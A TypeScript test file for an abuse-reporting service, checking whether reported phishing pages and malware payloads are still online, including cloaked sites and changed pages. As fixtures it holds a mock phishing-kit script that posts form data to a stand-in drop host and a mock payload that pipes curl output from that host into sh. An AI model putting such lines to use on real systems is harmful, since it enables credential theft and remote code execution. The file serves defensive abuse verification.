import { describe, expect, test } from "bun:test";

import { validateAbuseReportRequest } from "../abuse/contracts";
import { AbuseRepository } from "../abuse/repository";
import { ArtifactsEntity } from "../db/entities/artifacts";
import { SubmissionsEntity } from "../db/entities/submissions";
import { useTemporaryDatabase } from "../db/test_helpers";
import { generateId } from "../db/ids";
import { sha256Hex } from "../util/hash";
import { WebsiteCaptureFailedError, WebsiteUnreachableError } from "../website/archive/errors";
import type { WebsiteArchiveResult } from "../website/archive/types";
import { kitCapture, templatePage } from "../website/test_mhtml";
import type { WebsiteKitResource } from "../website/types";
import { CONTENT_VERIFIED_EVENT, contentVerificationsOf, stillAbusive, verifyReportedContent, type ContentVerificationDependencies } from "./content";

useTemporaryDatabase();

const HOST = "login.kit-example.com";
const URL_ = `https://${HOST}/verify`;
const NOW = new Date("2026-11-20T10:00:00Z");
/** The kit's own script, as the case captured it. */
const KIT_JS = `(()=>{const steal=(f)=>fetch("https://drop.kit-example.net/c",{method:"POST",body:new FormData(f)});${"/*kit*/".repeat(200)}})();`;
const LIBRARY_JS = `/*! jQuery v3.7.1 */${"x".repeat(2_000)}`;

/** The kit's page as its server sends it: per-request tokens change the body, never its template. */
const kitPage = (host: string, token = "a1") => `<html><head><title>Verify</title></head><body><input type="hidden" name="csrf" value="${token}">${templatePage(10, (card) => `Confirm your ${host} account ${card} `.repeat(4))}</body></html>`;
/** What a cloaking kit shows plain requests and reviewers. */
const DECOY = `<html><head><title>Welcome</title></head><body>${templatePage(6, (card) => `Our bakery menu item ${card} `.repeat(5), () => "menu")}</body></html>`;

type Answer = { status?: number; body: string | Buffer; type?: string } | ((headers: Headers) => { status?: number; body: string | Buffer; type?: string });

/** A site answering by URL, recording every request; DNS resolves unless `gone`. */
function site(answers: Record<string, Answer>, options: { gone?: boolean } = {}) {
	const requested: string[] = [];
	const dependencies: ContentVerificationDependencies["site"] = {
		dns: {
			resolve4: async () => {
				if (options.gone) throw Object.assign(new Error("ENOTFOUND"), { code: "ENOTFOUND" });
				return ["203.0.113.10"];
			},
			resolve6: async () => { throw Object.assign(new Error("ENODATA"), { code: options.gone ? "ENOTFOUND" : "ENODATA" }); },
			resolveCname: async () => { throw Object.assign(new Error("ENOTFOUND"), { code: "ENOTFOUND" }); },
		},
		rdap: { rdapLocator: async () => undefined },
		assertPublicHost: async () => undefined,
		now: () => NOW,
		fetch: async (input, init) => {
			const url = input.toString();
			requested.push(url);
			const answer = answers[url];
			if (!answer) return new Response("Not Found", { status: 404, headers: { "content-type": "text/html" } });
			const { status = 200, body, type = "text/html" } = typeof answer === "function" ? answer(new Headers(init?.headers)) : answer;
			return new Response(typeof body === "string" ? body : new Uint8Array(body), { status, headers: { "content-type": type } });
		},
	};
	return { requested, dependencies };
}

/** A browser capture of `url` that ended on `html`, with its raw document and kit files. */
function capture(url: string, html: string, options: { rawBody?: string; kitResources?: WebsiteKitResource[]; cloaked?: boolean; mhtml?: Buffer } = {}): WebsiteArchiveResult {
	const hostname = new URL(url).hostname;
	return {
		requestedUrl: url,
		url,
		hostname,
		navigationHops: [{ index: 0, url, hostname, status: 200, contentCaptured: true, bodyCaptured: true }],
		hopBodies: [{ hopIndex: 0, body: Buffer.from(options.rawBody ?? html) }],
		archivedAt: NOW,
		mhtml: options.mhtml ?? kitCapture(hostname, "9", { body: html }),
		html: Buffer.from(html),
		text: Buffer.from(html.replace(/<[^>]+>/g, " ")),
		...(options.kitResources ? { kitResources: options.kitResources } : {}),
		...(options.cloaked ? { cloaking: { outcome: "unresolved", detail: "every route saw the decoy" } as WebsiteArchiveResult["cloaking"] } : {}),
	};
}

const resource = (path: string, body: string): WebsiteKitResource => ({ url: `https://${HOST}${path}`, mimeType: "application/javascript", size: Buffer.byteLength(body), sha256: sha256Hex(body) });

/**
 * A reported case: the submission with its walk of the site (the raw page and
 * its MHTML stored as the analysis stores them when `captured`), and its
 * report with one target.
 */
async function reported(options: { rawPage?: string; renderedPage?: string; kitResources?: WebsiteKitResource[]; payload?: { url: string; sha256: string }; userAgent?: string; noCase?: boolean } = {}) {
	const submissionId = generateId();
	const hops = [{ index: 0, url: URL_, hostname: HOST, status: 200, contentCaptured: true, bodyCaptured: options.rawPage !== undefined }];
	if (!options.noCase) {
		await SubmissionsEntity.create({ id: submissionId, kind: "website", dedupeKey: `content-${submissionId}`, status: "reported", data: { kind: "website", website: { url: URL_, routes: [{ hops }], ...(options.kitResources ? { kitResources: options.kitResources } : {}) } } });
		if (options.rawPage !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: "chain-hop-0.html", kind: "website_hop_body", buffer: Buffer.from(options.rawPage) });
		if (options.renderedPage !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: "website.mhtml", kind: "website_mhtml", buffer: kitCapture(HOST, "1", { body: options.renderedPage }) });
	}
	const request = await validateAbuseReportRequest({ targets: [HOST], allegationCategory: options.payload ? "malware" : "phishing", description: "Credential phishing page.", observedUrls: [{ target: HOST, urls: [options.payload?.url ?? URL_] }] });
	const report = await AbuseRepository.createReport({
		request: { ...request, ...(options.payload ? { originalRequest: { kind: "malware_payload_host", payload: options.payload } } : {}), ...(options.userAgent ? { reportedUserAgent: options.userAgent } : {}) },
		...(options.noCase ? {} : { submissionId }),
		reporter: {},
	});
	const [target] = await AbuseRepository.listTargets(report.reportId);
	return { submissionId, target: { reportId: report.reportId, targetId: target!.id, url: options.payload?.url ?? URL_ } };
}

/** Browser and classifier stand-ins that record whether they were needed. */
function stages(capturePage?: (url: string) => WebsiteArchiveResult | Error, verdict = "phishing") {
	const used = { captures: 0, classifications: 0 };
	const dependencies: Pick<ContentVerificationDependencies, "capture" | "classify" | "isShared"> = {
		capture: async ({ url }) => {
			used.captures += 1;
			if (!capturePage) throw new Error("The browser was not expected.");
			const result = capturePage(url);
			if (result instanceof Error) throw result;
			return result;
		},
		classify: async () => {
			used.classifications += 1;
			return { finding: verdict as "phishing", ...(verdict === "phishing" ? {} : { reason: "a bakery menu, nothing asked of visitors" }) };
		},
		isShared: async () => false,
	};
	return { used, dependencies };
}

describe("verifying that the reported content is still served", () => {
	test("a domain that no longer resolves is gone, without a request to the site or a browser", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const { requested, dependencies } = site({ [URL_]: { body: kitPage(HOST) } }, { gone: true });
		const { used, dependencies: browser } = stages();
		const verification = await verifyReportedContent(target, {}, { site: dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "gone", tier: "check", state: "domain_gone", url: URL_ });
		expect(stillAbusive(verification)).toBe(false);
		expect(requested).toEqual([]);
		expect(used).toEqual({ captures: 0, classifications: 0 });
	});

	test("a plain request that gets the case's page by its template is the site serving it, with no browser; a fresh token changes nothing", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST, "token-at-report") });
		const { dependencies } = site({ [URL_]: { body: kitPage(HOST, "token-now") } });
		const { used, dependencies: browser } = stages();
		const verification = await verifyReportedContent(target, {}, { site: dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "served", tier: "fetch", state: "online" });
		expect(verification.verdict === "served" && verification.matches.map((match) => match.kind)).toEqual(["page_structure"]);
		expect(used.captures).toBe(0);
		// The same page byte for byte also matches by body.
		const same = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: kitPage(HOST, "token-at-report") } }).dependencies, ...browser });
		expect(same.verdict === "served" && same.matches.map((match) => match.kind).sort()).toEqual(["page_body", "page_structure"]);
	});

	test("the kit's own script, byte for byte on the site's host, proves it while the page answers; a library script or a removed page does not", async () => {
		const kit = resource("/assets/kit.js", KIT_JS);
		const library = resource("/assets/jquery.min.js", LIBRARY_JS);
		const { target } = await reported({ kitResources: [kit, library] });
		const page = "<html><body>loading…</body></html>";
		const online = site({ [URL_]: { body: page }, [kit.url]: { body: KIT_JS, type: "application/javascript" }, [library.url]: { body: LIBRARY_JS, type: "application/javascript" } });
		const { used, dependencies: browser } = stages(() => new WebsiteCaptureFailedError([new WebsiteUnreachableError("residential", "net::ERR_CONNECTION_RESET")]));
		const verification = await verifyReportedContent(target, {}, { site: online.dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "served", tier: "fetch", matches: [{ kind: "kit_file", sha256: kit.sha256, url: kit.url }] });
		expect(online.requested).not.toContain(library.url);
		expect(used.captures).toBe(0);

		// The page is removed while its script stays behind: a plain request proves nothing, so the browser looks.
		const removed = site({ [URL_]: { status: 404, body: "Not Found" }, [kit.url]: { body: KIT_JS, type: "application/javascript" } });
		const after = await verifyReportedContent(target, {}, { site: removed.dependencies, ...browser });
		expect(after).toMatchObject({ verdict: "unverified", tier: "browser", state: "removed" });
		expect(after.verdict === "unverified" && after.reason).toContain("ERR_CONNECTION_RESET");
		expect(removed.requested).not.toContain(kit.url);
	});

	test("a payload is fetched as the downloader the report names gets it, and matches only byte for byte", async () => {
		const payloadUrl = `https://${HOST}/wksxgj/loader`;
		const bytes = Buffer.from(`#!/bin/zsh\n${"curl -s https://drop.kit-example.net | sh\n".repeat(30)}`);
		const { target } = await reported({ payload: { url: payloadUrl, sha256: sha256Hex(bytes) }, userAgent: "curl/8.7.1", noCase: true });
		const onlyCurl: Answer = (headers) => (headers.get("user-agent")?.startsWith("curl/") ? { body: bytes, type: "application/octet-stream" } : { status: 404, body: "Not Found" });
		const { used, dependencies: browser } = stages();
		const served = await verifyReportedContent(target, {}, { site: site({ [payloadUrl]: onlyCurl }).dependencies, ...browser });
		expect(served).toMatchObject({ verdict: "served", tier: "fetch", matches: [{ kind: "payload", url: payloadUrl, sha256: sha256Hex(bytes) }] });
		// The browser's request gets a 404, so the plain check says removed: the payload is served all the same.
		expect(served.state).toBe("removed");
		expect(used.captures).toBe(0);

		const swapped = await verifyReportedContent(target, { maxTier: "fetch" }, { site: site({ [payloadUrl]: { body: Buffer.from("echo other build"), type: "application/octet-stream" } }).dependencies, ...browser });
		expect(swapped).toMatchObject({ verdict: "unverified", tier: "fetch" });
	});

	test("a cloaked site is confirmed by the browser, and the page it got is learned: the next plain request that gets it needs no browser", async () => {
		// The case captured the page rendered only; its raw body was not kept.
		const { target } = await reported({ renderedPage: templatePage(10, (card) => `Confirm your account ${card} `.repeat(4)) });
		const cloaked = site({ [URL_]: { body: DECOY } });
		const rendered = templatePage(10, (card) => `Confirm your account ${card} `.repeat(4));
		const { used, dependencies: browser } = stages((url) => capture(url, rendered, { rawBody: kitPage(HOST, "b1") }));
		const first = await verifyReportedContent(target, {}, { site: cloaked.dependencies, ...browser });
		expect(first).toMatchObject({ verdict: "served", tier: "browser" });
		expect(first.verdict === "served" && first.matches.map((match) => match.kind).sort()).toEqual(["page_body", "page_structure"]);
		expect(first.observed?.structure?.sha256).toMatch(/^[a-f0-9]{64}$/);
		expect(used).toEqual({ captures: 1, classifications: 0 });

		// The decoy is never learned: the next plain request still gets it and still needs the browser.
		await verifyReportedContent(target, {}, { site: cloaked.dependencies, ...browser });
		expect(used.captures).toBe(2);
		// The kit stops cloaking: what the browser got is now what a plain request gets.
		const open = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: kitPage(HOST, "c7") } }).dependencies, ...browser });
		expect(open).toMatchObject({ verdict: "served", tier: "fetch", matches: [{ kind: "page_structure" }] });
		expect(used.captures).toBe(2);
		const events = await AbuseRepository.listEvents(target.reportId);
		expect(contentVerificationsOf(events, target.targetId).map((verification) => `${verification.verdict}/${verification.tier}`)).toEqual(["served/browser", "served/browser", "served/fetch"]);
		expect(events.filter((event) => event.eventType === CONTENT_VERIFIED_EVENT).every((event) => event.targetId === target.targetId)).toBe(true);
	});

	test("the kit's scripts from any host count in the browser, by hash", async () => {
		const backend = { url: "https://cdn.kit-backend.net/x/loader.js", mimeType: "application/javascript", size: Buffer.byteLength(KIT_JS), sha256: sha256Hex(KIT_JS) };
		const { target } = await reported({ kitResources: [backend] });
		const { dependencies: browser } = stages((url) => capture(url, "<p>changed wording</p>", { kitResources: [backend] }));
		const verification = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "served", tier: "browser", matches: [{ kind: "kit_file", url: backend.url, sha256: backend.sha256 }] });
	});

	test("a changed page goes to the classifier: still phishing is learned like a match, nothing found is not abuse", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const changedRaw = `<html><body>${templatePage(14, (card) => `New wallet login ${card} `.repeat(3), () => "w")}</body></html>`;
		const decoy = site({ [URL_]: { body: DECOY } });
		const phishing = stages((url) => capture(url, changedRaw));
		const changed = await verifyReportedContent(target, {}, { site: decoy.dependencies, ...phishing.dependencies });
		expect(changed).toMatchObject({ verdict: "changed_malicious", tier: "analysis", finding: "phishing" });
		expect(stillAbusive(changed)).toBe(true);
		expect(phishing.used).toEqual({ captures: 1, classifications: 1 });
		// The new version, once judged, is recognised by a plain request.
		const again = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: changedRaw } }).dependencies, ...phishing.dependencies });
		expect(again).toMatchObject({ verdict: "served", tier: "fetch" });

		const benign = stages((url) => capture(url, DECOY), "insufficient_evidence");
		const clean = await verifyReportedContent(target, {}, { site: decoy.dependencies, ...benign.dependencies });
		expect(clean).toMatchObject({ verdict: "not_malicious", tier: "analysis", reason: "a bakery menu, nothing asked of visitors" });
		expect(stillAbusive(clean)).toBe(false);
		// Without the classifier the change stays unverified.
		const bounded = await verifyReportedContent(target, { maxTier: "browser" }, { site: decoy.dependencies, ...benign.dependencies });
		expect(bounded).toMatchObject({ verdict: "unverified", tier: "browser" });
		expect(benign.used.classifications).toBe(1);
	});

	test("a site that shows every network a decoy is unverified and never classified", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const { used, dependencies: browser } = stages((url) => capture(url, DECOY, { cloaked: true }));
		const verification = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "unverified", tier: "browser", reason: "The site showed every network a decoy." });
		expect(used.classifications).toBe(0);
	});

	test("a report without a case has nothing to classify the page with", async () => {
		const { target } = await reported({ noCase: true });
		const { used, dependencies: browser } = stages((url) => capture(url, DECOY));
		const verification = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "unverified", tier: "analysis" });
		expect(used).toEqual({ captures: 1, classifications: 0 });
	});
});
